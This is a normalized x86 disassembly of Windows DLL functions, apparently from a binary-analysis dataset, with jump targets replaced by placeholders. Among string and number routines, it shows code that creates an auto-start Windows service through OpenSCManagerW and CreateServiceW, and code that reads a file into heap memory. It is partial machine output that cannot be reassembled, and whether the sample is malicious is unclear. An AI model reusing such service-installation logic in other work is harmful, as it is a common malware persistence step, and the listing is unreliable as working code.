push [ ebp - 0x50 ]
push 0x65
push esi
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x60 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x88 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x88 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp + 0x14 ]
movzx eax ax
mov [ ebp - 0x68 ] ecx
push eax
lea ecx [ ebp - 0x6c ]
call sub_10044159
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push [ ebp - 0x70 ]
mov eax [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push edi
mov [ ebp + 0x14 ] ecx
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x60 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x64 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x84 ] edx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x30
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x2c ]
call sub_1003f510
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x8c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_100582fb
add esp 0x4c
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax [ ebp - 0x8c ]
call sub_1004fa89
retn
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x68 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
and [ ebp - 0x54 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ ebx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003e9ec
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x54 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000bddb
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_1003f510
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
push 0x30
lea ecx [ ebp - 0x2c ]
test eax eax
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1003e9ec
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x68 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
mov ecx r--data
push [ ebp - 0x74 ]
sub eax esi
mov [ ebp - 0x60 ] eax
inc eax
push eax
call sub_1000bddb
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x60 ]
call sub_1000bddb
and [ ebp - 0x74 ] 0x0
push [ ebp - 0x5c ]
call sub_1003f510
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call sub_1007d0f0
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x84 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push 0x0
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_1000bddb
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_10018450
push ebp
mov ebp esp
sub esp 0xa90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xa88 ] eax
mov [ ebp - 0xa8c ] ecx
mov [ ebp - 0xa80 ] edx
mov [ ebp - 0xa90 ] ebx
test eax eax
je r-xdata
mov eax 0x1
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
test ebx ebx
je r-xdata
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0xa74 ]
push eax
push 0x104
push edi
call [ GetFullPathNameW@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0xa74 ]
push ecx
push 0x1
push 0x2
push 0x10
push 0xf003f
push esi
push esi
push ebx
call [ CreateServiceW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x2 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ CloseServiceHandle@IAT ]
push eax
call edi
push ebx
call edi
lea edx [ ebp - 0x4c ]
xor eax eax
call sub_10058c10
mov ecx edx
lea eax [ ebp - 0x86c ]
call sub_10017510
push esi
mov esi 0x104
lea ebx [ ebp - 0x86c ]
call sub_1003d910
lea edx [ ebp - 0xa84 ]
mov eax 0x2
call sub_10058c10
lea edx [ ebp - 0xa7c ]
mov eax 0x3
call sub_10058c10
lea edx [ ebp - 0xa78 ]
mov eax 0x4
call sub_10058c10
mov esi [ ebp - 0xa88 ]
push edx
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x664 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub esi ecx
lea ebx [ ebp - 0xa7c ]
sub ebx ecx
nop
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xa78 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop esi
lea eax [ edx + 0x7 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop esi
lea eax [ edx + 0x4 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xa8c ]
lea ecx [ ebp - 0xa78 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa7c ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
lea edx [ ebp - 0xa7c ]
push edx
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa78 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x9
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa84 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
lea ecx [ ebp - 0xa7c ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0xa78 ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xc
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0xb
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xa80 ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xd
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xa90 ]
push 0x1
push edx
lea ecx [ ebp - 0x664 ]
lea eax [ ebp - 0x86c ]
mov edx 0x80000002
call sub_10016580
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0xf
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10018870
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1002c3ef
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1003a3e3
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1006605f
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
sub_1001893a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1002fff7
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_100210d8
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1001897c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_10018b60
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x18
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov eax esi
call sub_1006dc90
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x18
test eax eax
je r-xdata
sub_10018bc0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_10050437
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push r--data
call sub_1002c5ed
cmp edx 0x10
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi ecx
cmp edi eax
jbe r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10016d10
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0x10 ]
push edx
sub eax ecx
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov ecx esi
call sub_100215b0
pop edi
pop esi
pop ebp
retn 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0xc
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0x10 ]
add ecx ebx
push ecx
push eax
call sub_10078db0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
add eax ebx
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10018d10
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push edi
cmp [ esi ] ebx
jne r-xdata
lea ecx [ ebp - 0x7c ]
push ecx
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x7c ] ebx
call sub_10015a50
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0x7c ]
lea ecx [ ebp - 0x78 ]
call sub_100545a0
test eax eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0xbf
call sub_10013830
mov eax 0x2
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov ecx [ ebp - 0x7c ]
mov edx [ ebp - 0x78 ]
push eax
call sub_10030c50
test eax eax
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x115
call sub_10013830
mov eax 0x3
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x78 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x2c
call sub_10013830
lea edx [ ebp - 0x24 ]
mov eax 0x8
call sub_10013830
lea edx [ ebp - 0x20 ]
mov eax 0xd7
call sub_10013830
lea edx [ ebp - 0x1c ]
mov eax 0x10a
call sub_10013830
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x8c ]
push edx
lea eax [ ebp - 0x88 ]
push eax
mov eax [ esi ]
mov [ ebp - 0x88 ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x80 ] ebx
call sub_1001d4d0
lea edx [ ebp - 0x74 ]
mov eax 0xe0
call sub_10013830
mov eax 0x4
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10018ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_10083428
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
xor edi edi
push edi
push 0x80
push 0x3
push edi
push edi
push 0x80000000
push eax
mov [ ebp - 0x44 ] ecx
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0x38 ] esi
cmp esi 0xffffffff
jne r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax 0xaaaaaaab
mul ecx
push edi
shr edx 0x1
push edi
add edx edx
push edi
add edx edx
push esi
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] edi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
inc ecx
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x3
jmp r-xdata
nop
push esi
call [ CloseHandle@IAT ]
mov eax 0x43
jmp r-xdata
mov edx eax
call sub_10066430
test al 0x3
je r-xdata
shr eax 0x2
lea edi [ eax + eax * 2 ]
mov [ ebp - 0x54 ] edi
mov edi edi
mov edi edi
lea ecx [ ebp - 0x3c ]
push ecx
call sub_1003b1ca
add esp 0x4
cmp [ ebp - 0x3c ] 0x0
je r-xdata
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
dec eax
test al 0x3
jne r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push esi
call [ CloseHandle@IAT ]
mov eax 0x4
jmp r-xdata
mov edi [ ebp - 0x48 ]
test edi edi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x4
lea ecx [ ebp - 0x3c ]
lea esi [ ebp - 0x30 ]
call sub_10041110
add esp 0x4
mov ecx [ ebp - 0x44 ]
mov edi [ ebp - 0x58 ]
add ecx 0xa0
push ecx
xor ebx ebx
mov ecx eax
mov edx edi
mov [ ebp - 0x4 ] ebx
call sub_1003ce70
lea ecx [ ebp - 0x30 ]
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_10061060
cmp esi 0x42
je r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp - 0x38 ]
push ebx
push ebx
push ebx
mov [ edi + 0xd4 ] bl
push edx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
call [ SetFilePointer@IAT ]
mov esi [ ebp - 0x38 ]
cmp eax 0xffffffff
jne r-xdata
cmp esi 0x43
jne r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push esi
call [ CloseHandle@IAT ]
mov eax 0x5
jmp r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_100246d0
test eax eax
jne r-xdata
mov edi [ ebp - 0x44 ]
call sub_100010b0
mov [ ebp - 0x58 ] eax
test eax eax
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x3d
call sub_10060ac0
mov eax [ ebp - 0x38 ]
push eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov esi [ ebp - 0x38 ]
mov ecx [ ebp - 0x4c ]
mov edi [ GetProcessHeap@IAT ]
push ecx
push eax
call edi
mov esi [ HeapFree@IAT ]
push eax
call esi
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x44 ]
push edx
